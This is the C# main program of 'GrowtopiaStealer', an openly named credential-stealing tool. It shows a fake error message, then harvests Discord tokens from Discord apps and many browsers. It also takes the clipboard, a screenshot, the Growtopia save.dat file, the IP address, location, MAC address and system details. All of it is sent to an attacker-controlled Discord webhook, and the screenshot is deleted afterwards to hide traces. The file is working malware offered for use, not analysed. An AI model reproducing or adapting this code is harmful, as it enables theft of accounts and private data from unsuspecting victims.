using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using System.Net.NetworkInformation;
using JNogueira.Discord.Webhook.Client;
using System.Drawing;
using System.Threading;
using System.IO;
using System.Windows.Forms;

namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
{
    static class Program
    {
        public static List<string> goSendTokens = DiscordStealing.AllTokens;
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            #region Fake error
            if (DiscordWebhook.FakeError == true)
                MessageBox.Show(DiscordWebhook.FakeErrorMessage); // Shows fake error if its enabled in DiscordWebhook.cs
            #endregion

            #region Stealing discord tokens from apps and browsers.
            Task.WaitAll(
            DiscordStealing.DiscordApp(),
            DiscordStealing.DiscordCanary(),
            DiscordStealing.DiscordPTB(),
            DiscordStealing.Chrome(),
            DiscordStealing.ChromeBeta(),
            DiscordStealing.FireFox(),
            DiscordStealing.Opera(),
            DiscordStealing.OperaGX(),
            DiscordStealing.Edge(),
            DiscordStealing.Yandex(),
            DiscordStealing.Brave(),
            DiscordStealing.EpicPrivacy(),
            DiscordStealing.Vivaldi(),
            DiscordStealing.ThreeHundredSixty(),
            DiscordStealing.CocCoc()
            );
            #endregion

            #region exists or not
            Growtopia.GrowtopiaExistOrNo();
            Discord.DiscordExistsOrNo();
            Visual_Studio.VisualStudioExistOrNo();
            #endregion

            #region Rainbow Line gif
            string rainbowline = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here https://i.imgur.com/tcU8x8P.gif​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​";
            #endregion

            #region String for send tokens to discord webhook
            string Tokens = string.Join(Environment.NewLine, goSendTokens.ToList());
            #endregion

            #region IP, IPv6, Country, City.
            // WebClient
            WebClient Amogus = new WebClient();
            // DNS host name
            String host = System.Net.Dns.GetHostName();
            // IP
            string IP = Amogus.DownloadString("https://ipapi.co/ip/");
            // IPv6
            System.Net.IPAddress IPv6 = Dns.GetHostEntry(host).AddressList[0];
            // Country
            string Country = Amogus.DownloadString("https://ipapi.co/country_name/");
            // City
            string City = Amogus.DownloadString("https://ipapi.co/city/");
            #endregion

            #region MAC Address
            var macAddress = NetworkInterface.GetAllNetworkInterfaces();
            var getTarget = macAddress[0].GetPhysicalAddress();
            #endregion

            #region UserName
            // UserName
            string User = Environment.UserName;
            #endregion

            #region Discord Webhook
            // Discord Webhook
            var client = new DiscordWebhookClient(DiscordWebhook.defaultWebhook);
            #endregion

            #region Rainbow line send
            var rainbow = new DiscordMessage(
                rainbowline,
                username: "GrowtopiaStealer | TheC0mpany",
                avatarUrl: "https://i.imgur.com/2Via1dY.jpg",
                tts: false
                );
            #endregion

            #region Embed webhook message with "JNogueira.Discord.Webhook.Client".
            // Messages
            var message = new DiscordMessage(
                "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here ",
                username: "GrowtopiaStealer | TheC0mpany",
                avatarUrl: "https://i.imgur.com/2Via1dY.jpg",
                tts: false,
                embeds: new[]{
                    new DiscordMessageEmbed(
                        "GrowtopiaStealer",
                        color: 65280,
                        author: new DiscordMessageEmbedAuthor("Time: " + DateTime.Now.ToString("h:mm:ss")),
                        description:
                               "\n ================================" +
                               "\n```UserName: " + User + "```" +
                               "\n```Machine Name: " + Environment.MachineName + "```" +
                               "\n```Active Window: " + SystemInfo.GetActiveWindowTitle() + "```" +
                               "\n ================================" +
                               "\n```OC: " + SystemInfo.GetSystemVersion() + "```" +
                               "\n```Screen Metrics: " + SystemInfo.ScreenMetrics() + "```" +
                               "\n```CPU: " + SystemInfo.GetCPUName() + "```" +
                               "\n```CPU: " + SystemInfo.GetGpuName() + "```" +
                               "\n```CPU: " + SystemInfo.GetRAM() + "```" +
                               "\n```BSSID: " + BSSID.GetBSSID() + "```" +
                               "\n ================================" +
                               "\n```IP: " + IP + "```" +
                               "\n```IPv6: " + IPv6 + "```" +
                               "\n```Country: " + Country + "```" +
                               "\n```City: " + City + "```" +
                               "\n```MAC Address: " + getTarget + "```" +
                               "\n ================================" +
                               "\n Grabbed Softwares:" +
                               (Counting.Growtopia > 0 ? "\n```Growtopia```" : "") +
                               (Counting.VisualStudio > 0 ? "\n```Visual Studio```" : "") +
                               (Counting.Discord > 0 ? "\n```Discord```" : "")
                               ,
                        thumbnail: new DiscordMessageEmbedThumbnail("https://i.imgur.com/2Via1dY.jpg"),
                        image: new DiscordMessageEmbedImage("https://cdn.discordapp.com/attachments/819331742212161576/877001811888865290/newlog.jpg"),
                        footer: new DiscordMessageEmbedFooter("GrowtopiaStealer | TheC0mpany", "https://i.imgur.com/2Via1dY.jpg")
                               )});;
            #endregion

            #region ClipBoard
            // Send cliboard with diffrent message because its can be long text and you will lost log data
            var clipboard = new DiscordMessage(
                 "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here ",
                 username: "GrowtopiaStealer | TheC0mpany",
                 avatarUrl: "https://i.imgur.com/2Via1dY.jpg",
                 tts: false,
                 embeds: new[]{
                    new DiscordMessageEmbed(
                        "Clipboard | GrowtopiaStealer",
                        color: 65280,
                        author: new DiscordMessageEmbedAuthor("Clipboard - " + Environment.MachineName + " " + Environment.UserName),
                        description:
                        "\n```" + Buffer.GetBuffer() + "```"
                        ,
                        thumbnail: new DiscordMessageEmbedThumbnail("https://i.imgur.com/2Via1dY.jpg"),
                        image: new DiscordMessageEmbedImage("https://cdn.discordapp.com/attachments/819331742212161576/877001757346132028/clipboard.jpg"),
                        footer: new DiscordMessageEmbedFooter("GrowtopiaStealer | TheC0mpany", "https://i.imgur.com/2Via1dY.jpg")
                               )});
            #endregion
            #region Tokens
            var token = new DiscordMessage(
                "Tokens: \n" + Tokens,
                username: "GrowtopiaStealer | TheC0mpany",
                avatarUrl: "https://i.imgur.com/2Via1dY.jpg",
                tts: false
                );
            #endregion

            #region Sending logs
            client.SendToDiscord(rainbow);
            Thread.Sleep(500);
            client.SendToDiscord(message);
            Thread.Sleep(1500);
            client.SendToDiscord(clipboard);
            Thread.Sleep(1500);
            client.SendToDiscord(token);
            Thread.Sleep(1500);
            client.SendToDiscord(rainbow);
            Thread.Sleep(1500);
            #endregion

            #region Ghost ping
            string mssgBody = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here ";
            #endregion

            #region Sending save.dat and screenshot to discord webhook.
            Screenshot.GetScreenshot();
            string filename = Environment.MachineName + "." + Environment.UserName + ".dat";
            string fileformat = "dat";
            string filepath = GrowtopiaStealer.Growtopia.savePath;
            string application = "";
            string filename1 = "Screenshot-" + Environment.MachineName + ".png";
            string fileformat1 = "png";
            string filepath1 = @"C:\Users\" + User + @"\AppData\Local\Temp\screenshot.png";
            try
            {
                DiscordWebhook.SendFile(mssgBody, filename, fileformat, filepath, application); // Sending Save.dat
                client.SendToDiscord(rainbow);
            }
            catch
            {
                DiscordWebhook.Send("Growtopia save.dat doesn't exists.");
            }
            try
            {
                DiscordWebhook.SendFile(mssgBody, filename1, fileformat1, filepath1, application); // Sending Screenshot
            }
            catch
            {
                DiscordWebhook.Send("Log size is more then 8 MB. Sending isn`t available.");
            }
            #endregion

            #region Delete screenshot file
            //Delete screenshot file
            Finish();
           
            void Finish()
            {
                Thread.Sleep(15000);
                File.Delete(@"C:\Users\" + User + @"\AppData\Local\Temp\screenshot.png");
            }
            #endregion
        }
    }
}